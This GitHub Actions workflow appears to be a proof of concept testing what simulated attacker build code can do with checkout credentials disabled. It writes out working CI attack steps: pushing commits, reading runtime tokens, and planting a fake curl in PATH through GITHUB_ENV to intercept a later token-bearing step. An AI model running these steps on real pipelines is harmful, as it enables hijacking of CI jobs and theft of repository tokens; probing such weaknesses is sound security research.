name: "Test: RCE paths with persist-credentials false"

on:
  workflow_dispatch:

permissions:
  contents: write
  pull-requests: write

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - name: Checkout
      uses: actions/checkout@v5
      with:
        persist-credentials: false

    - name: Simulate autogen.sh (attacker code, no GITHUB_TOKEN in env)
      run: |
        echo "=== 1. Direct git push ==="
        echo "test" >> rce-test.txt
        git config user.email "attacker@evil.com"
        git config user.name "Attacker"
        git add rce-test.txt
        git commit -m "attacker commit" || true
        git push origin master 2>&1 || echo "PUSH_FAILED"

        echo ""
        echo "=== 2. ACTIONS_RUNTIME_TOKEN ==="
        echo "ACTIONS_RUNTIME_TOKEN=${ACTIONS_RUNTIME_TOKEN:-NOT_FOUND}"
        echo "ACTIONS_RUNTIME_URL=${ACTIONS_RUNTIME_URL:-NOT_FOUND}"

        echo ""
        echo "=== 3. Plant fake curl in PATH via GITHUB_ENV ==="
        mkdir -p /tmp/fakebins
        printf '#!/bin/bash\necho "[FAKE CURL] $@" >> /tmp/curl-intercept.log\n/usr/bin/curl "$@"\n' > /tmp/fakebins/curl
        chmod +x /tmp/fakebins/curl
        echo "PATH=/tmp/fakebins:$PATH" >> $GITHUB_ENV
        echo "INJECTED=yes_we_are_in" >> $GITHUB_ENV

    - name: Step after autogen (token used here)
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      run: |
        echo "=== Intercepted curl calls? ==="
        cat /tmp/curl-intercept.log 2>/dev/null || echo "no intercept log"
        echo ""
        echo "=== INJECTED var from prev step ==="
        echo "INJECTED=$INJECTED"
        echo ""
        echo "=== Try API call with token ==="
        curl -sf -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/repos/sonnet-tools/nut-poc | python3 -c "import sys,json; d=json.load(sys.stdin); print('repo name:', d['full_name'], 'permissions:', d.get('permissions','n/a'))" 2>/dev/null || echo "API call failed"
